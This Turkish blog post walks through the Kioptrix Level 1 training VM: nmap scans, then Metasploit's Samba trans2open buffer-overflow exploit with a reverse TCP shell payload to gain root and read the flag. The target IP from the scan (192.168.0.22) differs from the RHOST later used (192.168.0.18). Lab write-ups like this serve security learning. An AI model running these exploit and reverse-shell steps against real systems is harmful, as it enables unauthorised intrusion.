---
layout: post
title: Kioptrix Level 1 Writeup
categories: tr
---




&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Kioptrix</strong>, içerisindeki çeşitli zafiyetleri istismar ettiğimiz, bunlar sayesinde erişimler elde 
edebildiğimiz ve bu şekilde sistemi ele geçirmeye çalıştığımız bir sanal makine uygulamasıdır.
Bu yazımda Kioptrix <strong>Level 1</strong> sanal makinesi çözümünü yapacağım. Sanal makineyi <a href = "http://www.kioptrix.com/blog/test-page/" >şu</a> bağlantı 
üzerinden indirebilirsiniz. 
 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Öncelikle sanal makinenin ağ üzerinde hangi ip adresini aldığını öğrenmek için <strong>nmap</strong> aracıyla
genel bir ağ taraması yapıyoruz. 

	nmap -sV -T4 192.168.0.0/24


<img src="/img/kioptrix/hedef-tespiti.png">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bu ağ taraması sonucuna göre Kioptrix Level 1 sanal makinasının aldığı ip adresi 192.168.0.22 olarak
görünüyor. Bu bilgiyi kullanarak şimdi açık portları tespit etmek için başka bir tarama yapacağız.

	nmap -sV -T4 192.168.0.22 --open


<img src="/img/kioptrix/hedef-tarama.png">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bu işlem sonucunda açık olan portları aşağıdaki gibi listeliyoruz.  <strong>Netbios-ssn</strong> servisi
üzerinden işlem yapmaya çalışacağız. Burada sambanın bu sürümünde bulunan <strong>arabellek taşması(buffer overflow)</strong>
açığı istismar edilecektir.


 | 139/tcp | open | netbios-ssn |	 Samba smbd (workgroup: MYGROUP)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Metasploit Framework</strong> üzerinde <strong>exploit</strong> aramaya başlıyoruz. 

	msf> search samba

<img src="/img/kioptrix/search-exploit.jpeg">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Burada listelenen çözümlerden sistemimiz ile ilgili olan seçiyoruz. 

	msf>  use exploit/linux/samba/trans2open



&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bu aşamada kullandığımız exploit sayesinde samba servisi açığından yararlanabiliyoruz fakat
hedef sistem üzerinde bir kontrol elde edemiyoruz. Burada hedef sisteme sızmayı sağlayan ve 
istediğimiz işlemleri gerçekleştirmemizi sağlayan <strong>payload</strong>lardan birini kullanmamız gerekiyor.
Uygun olabilecek payloadları aratıyoruz ve buradan <strong>reverse_tcp</strong> seçimini yapıp hedefe karşı bir
reverse shell uygulaması yapacağız. Hedefin tepkisi sonucu terminalden bir reverse shell bağlantısı
kurulacak. Sonrasında eklememiz gereken parametreleri görmek ve eklemek için aşağıdaki adımları
uyguluyoruz.



	msf> show payloads
	msf> set PAYLOAD generic/shell_reverse_tcp
	msf> options
	msf> set RHOST 192.168.0.18
	msf> set LHOST 192.168.0.14
	msf> run

<img src="/img/kioptrix/search-payload.jpeg">

<img src="/img/kioptrix/options.jpeg">

<img src="/img/kioptrix/root-erisim.jpeg">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Belli bir süre devam eden işlem sonucunda hedefe root erişimi sağlıyoruz. Artık içeride 
bulunmak istenen mesajı aramaya başlıyoruz. Önemli gördüğümüz dizinler arasında dolanırken
gözümüze <strong>var</strong> dizini takılıyor . Buraya girdiğmizde <strong>mail</strong> adlı bir dosya daha görüyoruz. Bunun da
içerisine girdiğmizde dosya tipi <strong>ASCII mail text</strong> olan '<strong>root</strong>' adlı bir dosya görüyoruz. Bunu 
okuduğumuzda bu  makinenin <strong>FLAG</strong> değerine ulaşıyoruz.

<img src="/img/kioptrix/sonuc1.jpeg">
<img src="/img/kioptrix/sonuc2.jpeg">



